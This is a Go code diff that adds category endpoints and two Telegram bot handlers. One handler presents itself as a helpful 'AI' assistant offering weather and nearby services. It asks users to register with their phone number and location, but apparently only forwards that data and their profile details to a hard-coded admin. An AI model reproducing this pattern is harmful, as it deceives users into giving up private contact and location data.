@@ -1,11 +1,13 @@
 package form_handler
 
 import (
+	"fmt"
 	form_dto "ijro-nazorat/modul/form/dto"
 	form_service "ijro-nazorat/modul/form/service"
 	"log"
 	"net/http"
 	"strconv"
+	"strings"
 
 	"git.sriss.uz/shared/shared_service/request"
 	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
@@ -35,9 +37,11 @@ func NewAppHandler(gorm *echo.Group, db *gorm.DB, log *log.Logger) {
 	routes := gorm.Group("/app")
 	{
 		routes.GET("", handler.All)
+		routes.GET("/page", handler.Page)
 		routes.GET("/:id", handler.Show)
 		routes.POST("", handler.Create)
 		routes.GET("/bot", handler.Telegram)
+		routes.GET("/user", handler.User)
 	}
 }
 
@@ -103,17 +107,41 @@ func (handler *AppHandler) All(ctx echo.Context) error {
 		}
 	}
 
-	// return ctx.JSON(200, data)
+	return ctx.JSON(200, data)
 
-	return ctx.Render(200, "apps.html", map[string]any{
-		"Apps":        data.Data, // AppInfo[] turi
-		"CurrentPage": data.CurrentPage,
-		"TotalPages":  data.TotalPages,
-		"PageSize":    data.PageSize,
-		"Total":       data.Total,
-		"Search":      categoryFilter,
-	})
+	// return ctx.Render(200, "apps.html", map[string]any{
+	// 	"Apps":        data.Data, // AppInfo[] turi
+	// 	"CurrentPage": data.CurrentPage,
+	// 	"TotalPages":  data.TotalPages,
+	// 	"PageSize":    data.PageSize,
+	// 	"Total":       data.Total,
+	// 	"Search":      categoryFilter,
+	// })
 }
+
+func (handler *AppHandler) Page(ctx echo.Context) error {
+	req := request.Request(ctx)
+
+	filter := func(tx *gorm.DB) *gorm.DB {
+		return tx.
+			Table("app_category").
+			Select(`
+				app_category.id,
+				app_category.name,
+				to_char(app_category.created_at, 'YYYY-MM-DD HH24:MI') AS created_at,
+				to_char(app_category.updated_at, 'YYYY-MM-DD HH24:MI') AS updated_at`).
+			Group("app_category.id").
+			Order("app_category.id DESC")
+	}
+
+	data, err := handler.service.Page(req.Context(), filter)
+	if err != nil {
+		return err
+	}
+
+	return ctx.JSON(200, data)
+}
+
 func (handler *AppHandler) Show(ctx echo.Context) error {
 	req := request.Request(ctx)
 
@@ -210,81 +238,297 @@ func (handler *AppHandler) Create(ctx echo.Context) error {
 }
 
 func (handler *AppHandler) Telegram(ctx echo.Context) error {
-	// Telegram bot yaratish
+	req := request.Request(ctx)
+
+	// 1️⃣ DB DAN DATA OLISH
+	filter := func(tx *gorm.DB) *gorm.DB {
+		return tx.
+			Table("app_category").
+			Select(`
+				id,
+				name,
+				to_char(created_at, 'YYYY-MM-DD HH24:MI') AS created_at,
+				to_char(updated_at, 'YYYY-MM-DD HH24:MI') AS updated_at`).
+			Group("id").
+			Order("id ASC")
+	}
+
+	data, err := handler.service.Page(req.Context(), filter)
+	{
+		if err != nil {
+			return err
+		}
+	}
+
+	// 2️⃣ DB DATA → TELEGRAM TEXT
+	var dataText strings.Builder
+	dataText.WriteString("📦 <b>App royxati</b>\n\n")
+
+	for i := 1; i <= 100; i++ {
+		for _, app := range data {
+			dataText.WriteString("━━━━━━━━━━━━━━\n")
+
+			// FOR: i va app.ID
+			dataText.WriteString(fmt.Sprintf("📦 <b>FOR:</b> %d, %d\n", i, app.ID))
+
+			dataText.WriteString(fmt.Sprintf("🆔 <b>ID:</b> %d\n", app.ID))
+			dataText.WriteString(fmt.Sprintf("📁 <b>Category:</b> %s\n", app.Name))
+
+			dataText.WriteString(fmt.Sprintf("📅 <b>Created:</b> %s\n\n", app.CreatedAt))
+
+			// Category JSON dan name olish
+			// var category map[string]any
+			// if err := json.Unmarshal([]byte(app.Name), &category); err != nil || category["name"] == nil {
+			// 	category = map[string]any{"name": "Noma'lum"}
+			// }
+
+			// dataText.WriteString(fmt.Sprintf("📁 <b>Category:</b> %v\n", category["name"]))
+		}
+	}
+
+	finalDataText := dataText.String()
+	// 3️⃣ TELEGRAM BOT
 	bot, err := tgbotapi.NewBotAPI(handler.TelegramToken)
 	if err != nil {
-		log.Println("Bot yaratishda xatolik:", err)
-		return ctx.JSON(http.StatusInternalServerError, map[string]string{"error": "Bot yaratilmadi"})
+		return ctx.JSON(500, echo.Map{"error": "Bot yaratilmadi"})
 	}
 
-	// Webhookni o'chirish (polling ishlashi uchun)
 	_, _ = bot.Request(tgbotapi.DeleteWebhookConfig{})
 
-	chatID := handler.ChatID
-
-	// 1️⃣ /start xabarini yuborish
-	startMsg := tgbotapi.NewMessage(chatID, "Salom! /start ni bosishingiz mumkin.")
-	bot.Send(startMsg)
-
-	// 2️⃣ Inline button yaratish
-	msg := tgbotapi.NewMessage(chatID, "Tugmani bosing:")
-	keyboard := tgbotapi.NewInlineKeyboardMarkup(
-		tgbotapi.NewInlineKeyboardRow(
-			tgbotapi.NewInlineKeyboardButtonData("Button 1", "btn_1"),
-			tgbotapi.NewInlineKeyboardButtonData("Button 2", "btn_2"),
-		),
-	)
-	msg.ReplyMarkup = keyboard
-	if _, err := bot.Send(msg); err != nil {
-		log.Println("Button yuborilmadi:", err)
-	}
-
-	// 3️⃣ Polling orqali xabar va button callback qabul qilish
+	// 4️⃣ POLLING
 	go func() {
 		u := tgbotapi.NewUpdate(0)
 		u.Timeout = 60
 		updates := bot.GetUpdatesChan(u)
 
 		for update := range updates {
-			chatID := int64(0)
-			userName := ""
 
-			// Agar foydalanuvchi xabar yuborsa
+			// /start
 			if update.Message != nil {
-				chatID = update.Message.Chat.ID
-				userName = update.Message.From.UserName
-				text := update.Message.Text
+				chatID := update.Message.Chat.ID
+				userName := update.Message.From.UserName
 
-				if text == "/start" {
-					msg := tgbotapi.NewMessage(chatID, "Salom, "+userName+"!")
+				if update.Message.Text == "/start" {
+
+					msg := tgbotapi.NewMessage(
+						chatID,
+						"Assalomu alaykum <b>"+userName+"</b>!\nTugmalardan birini tanlang 👇",
+					)
+					msg.ParseMode = "HTML"
+
+					keyboard := tgbotapi.NewInlineKeyboardMarkup(
+						tgbotapi.NewInlineKeyboardRow(
+							tgbotapi.NewInlineKeyboardButtonData("👋 Salom", "btn_hello"),
+						),
+						tgbotapi.NewInlineKeyboardRow(
+							tgbotapi.NewInlineKeyboardButtonData("📄 Ma'lumotlar", "btn_data"),
+						),
+						tgbotapi.NewInlineKeyboardRow(
+							tgbotapi.NewInlineKeyboardButtonData("📞 Telefon", "btn_phone"),
+						),
+					)
+
+					msg.ReplyMarkup = keyboard
 					bot.Send(msg)
-				} else {
-					reply := userName + ", siz shuni yozdingiz: " + text
-					bot.Send(tgbotapi.NewMessage(chatID, reply))
+				}
+
+				// Agar user contact yuborsa
+				if update.Message.Contact != nil {
+					phone := update.Message.Contact.PhoneNumber
+					msg := tgbotapi.NewMessage(chatID, fmt.Sprintf("📞 Siz yuborgan telefon raqam: %s", phone))
+					bot.Send(msg)
 				}
 			}
 
-			// Agar foydalanuvchi button bosgan bo‘lsa
+			// BUTTON CALLBACK
 			if update.CallbackQuery != nil {
-				callback := update.CallbackQuery
-				chatID = callback.Message.Chat.ID
-				userName = callback.From.UserName
+				cb := update.CallbackQuery
+				chatID := cb.Message.Chat.ID
+				userName := cb.From.UserName
 
-				var answerText string
-				switch callback.Data {
-				case "btn_1":
-					answerText = userName + ", siz Button 1 ni bosdingiz!"
-				case "btn_2":
-					answerText = userName + ", siz Button 2 ni bosdingiz!"
+				switch cb.Data {
+
+				case "btn_hello":
+					msg := tgbotapi.NewMessage(chatID, "👋 Salom, <b>"+userName+"</b>!")
+					msg.ParseMode = "HTML"
+					bot.Send(msg)
+
+				case "btn_data":
+					// Agar data juda uzun bo‘lsa, bo‘lib yuborish
+					runes := []rune(finalDataText)
+					start := 0
+					const limit = 4000
+
+					for start < len(runes) {
+						end := start + limit
+						if end > len(runes) {
+							end = len(runes)
+						}
+						msg := tgbotapi.NewMessage(chatID, string(runes[start:end]))
+						msg.ParseMode = "HTML"
+						bot.Send(msg)
+						start = end
+					}
+
+				case "btn_phone":
+					msg := tgbotapi.NewMessage(chatID, "📞 Iltimos, telefon raqamingizni yuboring!")
+					contactBtn := tgbotapi.NewKeyboardButtonContact("📲 Telefonni yuborish")
+					keyboard := tgbotapi.NewReplyKeyboard(
+						tgbotapi.NewKeyboardButtonRow(contactBtn),
+					)
+					msg.ReplyMarkup = keyboard
+					bot.Send(msg)
+
 				default:
-					answerText = userName + ", noma'lum tugma"
+					msg := tgbotapi.NewMessage(chatID, "❓ Noma'lum buyruq")
+					bot.Send(msg)
 				}
 
-				bot.Send(tgbotapi.NewMessage(chatID, answerText))
-				bot.Request(tgbotapi.NewCallback(callback.ID, "✔"))
+				bot.Request(tgbotapi.NewCallback(cb.ID, "✔"))
 			}
 		}
 	}()
 
-	return ctx.JSON(http.StatusOK, map[string]string{"message": "Bot ishlayapti"})
+	return ctx.JSON(http.StatusOK, echo.Map{
+		"status": "telegram bot started",
+	})
+}
+
+func (handler AppHandler) User(ctx echo.Context) error {
+
+	bot, err := tgbotapi.NewBotAPI(handler.TelegramToken)
+	if err != nil {
+		return ctx.JSON(500, echo.Map{"error": "Bot error"})
+	}
+
+	// Webhookni o‘chiramiz (long polling)
+	_, _ = bot.Request(tgbotapi.DeleteWebhookConfig{})
+
+	go func() {
+
+		u := tgbotapi.NewUpdate(0)
+		u.Timeout = 60
+		updates := bot.GetUpdatesChan(u)
+
+		for update := range updates {
+
+			// ======================
+			// /start
+			// ======================
+			if update.Message != nil && update.Message.Text == "/start" {
+
+				user := update.Message.From
+				chatID := update.Message.Chat.ID
+
+				// Admin uchun user info
+				adminText := fmt.Sprintf(
+					"🆕 <b>Yangi foydalanuvchi</b>\n\n"+
+						"🆔 ID: <code>%d</code>\n"+
+						"👤 Username: @%s\n"+
+						"📛 First name: %s\n"+
+						"🧾 Last name: %s\n"+
+						"🌍 Lang: %s",
+					user.ID,
+					user.UserName,
+					user.FirstName,
+					user.LastName,
+					user.LanguageCode,
+				)
+
+				sendToAdminText(bot, adminText)
+
+				// Userga ruxsat so‘rash tugmalari
+				keyboard := tgbotapi.NewReplyKeyboard(
+					tgbotapi.NewKeyboardButtonRow(
+						tgbotapi.NewKeyboardButtonContact("📲 Telefon yuborish"),
+					),
+					tgbotapi.NewKeyboardButtonRow(
+						tgbotapi.NewKeyboardButtonLocation("📍 Lokatsiya yuborish"),
+					),
+				)
+
+				msg := tgbotapi.NewMessage(chatID, "🔥 Salom! Men – shaxsiy Hayot AI 🤖 bot man\n\n"+
+					"Ro‘yxatdan o‘ting, keyin har doim siz uchun kerakli ma’lumotlarni beraman:\n\n"+
+					"☁️ Hududingiz uchun aniq ob-havo\n"+
+					"🏧 Hozir ochiq yaqin bankomat, dorixona, zapravka, kafe\n"+
+					"🚌 Eng qisqa yo‘l va transport variantlari\n\n"+
+					"Ro‘yxatdan o‘tish uchun pastdagi tugmalarni bosing 🚀")
+				msg.ReplyMarkup = keyboard
+				bot.Send(msg)
+			}
+
+			// ======================
+			// CONTACT
+			// ======================
+			if update.Message != nil && update.Message.Contact != nil {
+
+				user := update.Message.From
+				chatID := update.Message.Chat.ID
+				phone := update.Message.Contact.PhoneNumber
+
+				adminText := fmt.Sprintf(
+					"📞 <b>Telefon yuborildi</b>\n\n"+
+						"🆔 User ID: <code>%d</code>\n"+
+						"👤 @%s\n"+
+						"📱 Phone: %s",
+					user.ID,
+					user.UserName,
+					phone,
+				)
+
+				sendToAdminText(bot, adminText)
+
+				bot.Send(tgbotapi.NewMessage(chatID, "✅ Telefon qabul qilindi"))
+			}
+
+			// ======================
+			// LOCATION (REAL PIN + USER INFO)
+			// ======================
+			if update.Message != nil && update.Message.Location != nil {
+
+				user := update.Message.From
+				chatID := update.Message.Chat.ID
+
+				lat := update.Message.Location.Latitude
+				lon := update.Message.Location.Longitude
+
+				// 1️⃣ ADMIN ga REAL LOCATION (PIN)
+				locationMsg := tgbotapi.NewLocation(ADMIN_ID, lat, lon)
+				bot.Send(locationMsg)
+
+				// 2️⃣ LOCATION ostiga USER INFO (TEXT)
+				adminText := fmt.Sprintf(
+					"📍 <b>Lokatsiya egasi</b>\n\n"+
+						"🆔 ID: <code>%d</code>\n"+
+						"👤 Username: @%s\n"+
+						"📛 First name: %s\n"+
+						"🧾 Last name: %s\n"+
+						"🌍 Lang: %s",
+					user.ID,
+					user.UserName,
+					user.FirstName,
+					user.LastName,
+					user.LanguageCode,
+				)
+
+				sendToAdminText(bot, adminText)
+
+				// 3️⃣ USER ga tasdiq
+				bot.Send(tgbotapi.NewMessage(chatID, "✅ Lokatsiya qabul qilindi"))
+			}
+
+		}
+	}()
+
+	return ctx.JSON(http.StatusOK, echo.Map{
+		"status": "telegram bot started",
+	})
+}
+
+const ADMIN_ID int64 = 415906009
+
+func sendToAdminText(bot *tgbotapi.BotAPI, text string) {
+	msg := tgbotapi.NewMessage(ADMIN_ID, text)
+	msg.ParseMode = "HTML"
+	bot.Send(msg)
 }
